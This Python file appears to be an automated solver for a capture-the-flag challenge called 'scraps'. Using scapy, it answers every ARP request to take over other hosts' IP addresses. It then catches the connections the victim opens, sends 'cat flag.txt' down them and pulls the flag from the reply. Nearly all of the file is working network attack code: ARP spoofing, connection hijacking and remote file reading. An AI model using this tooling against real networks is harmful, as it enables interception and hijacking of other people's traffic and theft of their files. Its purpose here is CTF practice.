# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re
import socket
import subprocess
import net
import threading

logger = logging.getLogger(__name__)

class ImpersonatorStrategy(strategy.Strategy):
    """
    ImpersonatorStrategy solves the scraps challenge by immediatly assuming the IP address asked for by any ARP request.
    It then waits for a TCP SYN, and upon recieving it starts listening for another 10 ports ahead within 15 seconds.
    """
    needsip = False
    challenges = ['scraps']

    class ImpersonatorModule(capture.Module):
        def __init__(self):
            self.ips = set()
            self.iface = None

        def start(self, sniffer):
            self.iface = sniffer.iface

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.Ether, scapy.ARP)):
                if pkt[scapy.Ether].src != str(net.ifhwaddr(self.iface)) and pkt[scapy.ARP].op == 1: # who-has
                    resp = scapy.Ether()/scapy.ARP(hwsrc=str(net.ifhwaddr('tap0')), hwdst=pkt.hwsrc, psrc=pkt.pdst, pdst=pkt.psrc, op="is-at")
                    scapy.sendp(resp, iface='tap0')

                    if pkt.pdst not in self.ips:
                        self.ips.add(pkt.pdst)
                        cidr = '{!s}/{:d}'.format(pkt.pdst, 28)
                        logger.info("Attaching new IP address {:s} to {:s}".format(cidr, self.iface))
                        subprocess.run(['ip', 'addr', 'add', cidr, 'dev', self.iface])

    class InterceptorModule(capture.Module):
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.flag = None
            self.iface = None
            self.sniffer = None

        def start(self, sniffer):
            self.iface = sniffer.iface
            self.sniffer = sniffer

        def intercept(self, pkt):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                addr = (pkt[scapy.IP].dst, pkt[scapy.TCP].dport + 10)
                logger.info("Listening on {!s}".format(addr))
                s.bind(addr)
                s.listen(1)
                conn, _ = s.accept()

                # Now we're talking!
                conn.sendall(b'cat flag.txt\n')
                resp = ""
                while self.flag is None:
                    resp += conn.recv(1024).decode('utf-8')
                    m = re.search(self.flagpattern, resp)
                    if m:
                        self.flag = m.group(0)
                        self.sniffer.stop()
            except OSError as e:
                logger.info("Expection while attempting to intercept: {!s}".format(e))
            finally:
                s.close()

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.TCP)):
                logger.debug(pkt.sprintf("[%Ether.src%]%IP.src%:%TCP.sport% > [%Ether.dst%]%IP.dst%:%TCP.dport% %TCP.flags%"))
                if pkt[scapy.Ether].dst == str(net.ifhwaddr(self.iface)) and pkt[scapy.TCP].flags == 2:
                    threading.Thread(target=self.intercept, args=(pkt,)).start()

    def execute(self, iface, flagpattern, canceltoken=None):
        socket.setdefaulttimeout(15)
        sniffer = capture.Sniffer(iface=iface)
        interceptor = self.InterceptorModule(flagpattern)
        sniffer.register(
            self.ImpersonatorModule(),
            interceptor
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return interceptor.flag
